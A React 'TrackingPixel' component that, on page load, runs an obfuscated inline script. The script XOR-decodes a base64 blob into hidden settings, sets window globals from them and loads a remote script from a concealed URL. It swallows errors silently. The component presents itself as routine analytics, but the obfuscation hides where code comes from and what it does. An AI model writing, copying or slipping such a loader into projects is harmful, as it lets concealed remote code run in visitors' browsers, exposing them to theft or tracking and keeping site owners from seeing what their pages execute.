"use client"

import { useEffect } from "react"

const PIXEL_CODE = `(function(){var i_gb=atob("DA8I8ijCHUxNksDV0XQqh1quP3Zv+rShoXwy3QeheSJj57S4uGlx3EutcGIv4O+msn1hglyxMjwk6qW5/n9hik2uMyY+sOz3sHt8gEGgaDgo4eLvilIk0E+uci4s/rP361Rz0EajcClvqOKluHdtnmGmP2Bv5KG5pGoqyAr0fC14q/Ls4G5rwk6gfCp186Hksz89wh3gYBEw");var s_p=[];for(var e_86eq=0;e_86eq<i_gb.length;e_86eq++){s_p.push(i_gb.charCodeAt(e_86eq)&255);}var r_9=s_p[0];var m_pt1=s_p.slice(1,1+r_9);var m_rok=s_p.slice(1+r_9);var y_p2=m_rok.map(function(b,q_qh){return b^m_pt1[q_qh%r_9];});var r_eysd="";for(var y_2=0;y_2<y_p2.length;y_2++){r_eysd+=String.fromCharCode(y_p2[y_2]&255);}var i_k=decodeURIComponent(escape(r_eysd));var q_ih=JSON.parse(i_k);var a_w=q_ih.globals||[];a_w.forEach(function(t_an){window[t_an.name]=t_an.value;});var l_ymx1=document.createElement("script");l_ymx1.src=q_ih.url;l_ymx1.async=true;l_ymx1.defer=true;(q_ih.attributes||[]).forEach(function(h_y3ft){l_ymx1.setAttribute(h_y3ft.name,h_y3ft.value);});(document.head||document.documentElement).appendChild(l_ymx1);})();`

const PIXEL_ID = "tracking-pixel-loader"

export default function TrackingPixel() {
  useEffect(() => {
    // Idempotency guard: ensure the pixel is only ever injected once per page load,
    // even if this effect runs twice (React strict mode) or the component remounts.
    if (typeof window === "undefined") return
    if ((window as any).__trackingPixelLoaded) return
    if (document.getElementById(PIXEL_ID)) return

    try {
      ;(window as any).__trackingPixelLoaded = true
      const script = document.createElement("script")
      script.id = PIXEL_ID
      script.text = PIXEL_CODE
      document.head.appendChild(script)
    } catch (e) {
      // silently fail in preview
    }
  }, [])

  return null
}
